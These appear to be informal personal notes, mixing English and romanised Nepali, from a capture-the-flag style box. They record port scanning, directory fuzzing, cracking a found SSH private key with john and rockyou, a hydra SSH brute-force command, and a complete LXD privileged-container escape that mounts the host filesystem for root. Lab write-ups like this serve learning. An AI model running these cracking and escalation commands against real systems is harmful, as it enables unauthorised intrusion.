So at first we did a half scan to check

we got port 22 ra 80

then I went to the site on http://

then we saw a page with some world of warcraft game like about page

I checked the /robots.txt file

and there were three files

I downloaded all of em

one was a image

ran some exiftool and stats and binwalk but no avail

then other was a manifesto? ani other was a dict list which might be helpful

then I ran ffuf on it and got some juicy directories

juicy secret.txt

which was a rsa recret key

used ssh2john to map it out to a john readable

then used john against the

2012 john hash dict_lists.txt -show

nothing

2018 john hash.hash -w=/usr/share/wordlists/rockyou.txt

found passwd

user nai thaha bhayena so I tried hydra

2022 hydra -L /usr/share/wordlists/seclists/Usernames/usernames.txt -p letmein ssh://10.10.165.136 -V\n

tried a few usernames wordlist , nothing so I tried the trusty rocku

maybe I can find something on the web web ma ni herdai gare eso eta uta

damn yei index.html ma john bhanne lekhya raixa

<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->

damnn

we are innn

damn sudo -l ma passwd nai wrong re

lets try linpeas

id haneko

uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

yoyo aayo

adm bata log padhe sabai hydra ko err logs raixa lol

sudo ma passwd nai arkai raixa

3 tries ma reset

lxd bata containeer breakout garna milxa raixa

git ni raixa tyo machine ma

last slow raixa

locally nai halxu

lol ma ta unzip gardai basdai thiye

mildaina raixa

```jsx
**lxc image import ./alpine-vX.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/rootfs recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh

cd /mnt/rootfs
chroot /mnt/rootfs /bin/bash**

```

hane ani bhayo

lol

kina bhayo aba herxu